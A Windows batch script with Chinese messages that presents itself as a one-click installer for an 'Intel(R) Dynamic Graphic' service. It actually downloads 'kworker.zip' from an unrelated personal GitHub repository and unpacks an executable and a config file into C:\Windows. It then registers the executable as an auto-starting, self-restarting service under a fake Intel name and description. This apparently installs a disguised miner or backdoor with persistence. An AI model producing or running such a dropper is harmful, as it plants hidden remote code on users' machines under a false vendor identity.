@echo off
chcp 65001 >nul
title Intel(R) Dynamic Graphic 一键安装脚本
echo ==========================================
echo   Intel(R) Dynamic Graphic 一键安装脚本
echo ==========================================
echo.

set SERVICE_NAME=Intel(R) Dynamic Graphic
set INSTALL_DIR=C:\Windows\Intel(R) Dynamic Graphic
set DOWNLOAD_URL=https://raw.githubusercontent.com/thm1472581-dotcom/kworker/master/win/kworker.zip

REM 检查管理员权限
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [错误] 请以管理员身份运行此脚本
    pause
    exit /b 1
)

REM 1. 创建目录
echo [信息] 正在创建安装目录...
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
echo [成功] 目录创建成功: %INSTALL_DIR%
echo.

REM 2. 下载文件
echo [信息] 正在下载程序包...
cd /d "%INSTALL_DIR%"
powershell -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile 'kworker.zip'" 2>nul
if not exist "kworker.zip" (
    echo [错误] 下载失败
    pause
    exit /b 1
)
echo [成功] 下载完成
echo.

REM 3. 解压文件
echo [信息] 正在解压文件...
powershell -Command "Expand-Archive -Path 'kworker.zip' -DestinationPath '%INSTALL_DIR%' -Force"
if %errorlevel% neq 0 (
    echo [错误] 解压失败
    pause
    exit /b 1
)
del kworker.zip 2>nul
echo.

REM 4. 验证文件
if not exist "%INSTALL_DIR%\Intel(R) Dynamic Graphic.exe" (
    echo [错误] 未找到 Intel(R) Dynamic Graphic.exe
    pause
    exit /b 1
)
if not exist "%INSTALL_DIR%\c" (
    echo [错误] 未找到配置文件 c
    pause
    exit /b 1
)

REM 5. 删除旧服务
echo [信息] 清理旧服务...
sc stop "%SERVICE_NAME%" >nul 2>&1
timeout /t 2 /nobreak >nul
sc delete "%SERVICE_NAME%" >nul 2>&1
timeout /t 1 /nobreak >nul

REM 6. 创建服务
echo [信息] 正在创建服务...
sc create "%SERVICE_NAME%" binPath= "\"%INSTALL_DIR%\Intel(R) Dynamic Graphic.exe\" --config=\"%INSTALL_DIR%\c\"" start= auto DisplayName= "%SERVICE_NAME%" >nul
if %errorlevel% neq 0 (
    echo [错误] 服务创建失败
    pause
    exit /b 1
)
sc description "%SERVICE_NAME%" "Intel 动态图形管理服务" >nul
echo [成功] 服务创建成功

REM 7. 配置自动重启
sc failure "%SERVICE_NAME%" reset= 86400 actions= restart/5000/restart/10000/restart/30000 >nul

REM 8. 启动服务（关键步骤）
echo.
echo [信息] 正在启动服务...
sc start "%SERVICE_NAME%" >nul 2>&1
if %errorlevel% neq 0 (
    echo [错误] 服务启动失败！请检查：
    sc query "%SERVICE_NAME%"
    echo.
    pause
    exit /b 1
)

REM 9. 等待并确认状态
timeout /t 2 /nobreak >nul
sc query "%SERVICE_NAME%" | find "RUNNING" >nul
if %errorlevel% equ 0 (
    echo [成功] 服务已成功启动 (RUNNING)
) else (
    echo [警告] 服务状态异常，请手动检查
)

REM 10. 确认开机自启
sc qc "%SERVICE_NAME%" | find "AUTO_START" >nul
if %errorlevel% equ 0 (
    echo [成功] 开机自启已设置 (AUTO_START)
) else (
    echo [警告] 开机自启设置异常
)

echo.
echo ==========================================
echo [成功] 安装完成！
echo ==========================================
echo 安装目录: %INSTALL_DIR%
echo 服务名称: %SERVICE_NAME%
echo 服务状态: 运行中
echo 启动类型: 自动
echo.
echo 验证自启动: 重启电脑后服务应自动运行
echo.
echo 常用命令:
echo   查看状态: sc query "%SERVICE_NAME%"
echo   启动服务: sc start "%SERVICE_NAME%"
echo   停止服务: sc stop "%SERVICE_NAME%"
echo   重启服务: sc stop "%SERVICE_NAME%" ^&^& sc start "%SERVICE_NAME%"
echo ==========================================
pause